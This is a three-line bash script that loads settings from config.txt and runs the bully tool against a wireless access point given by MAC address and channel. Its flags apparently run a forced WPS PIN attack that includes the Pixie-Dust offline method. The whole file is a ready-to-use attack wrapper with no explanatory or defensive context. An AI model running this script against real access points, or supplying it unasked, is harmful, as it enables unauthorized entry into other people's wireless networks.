#!/bin/bash

source config.txt

bully $interface -b $ap_mac -c $channel -P -d -v 4 -F
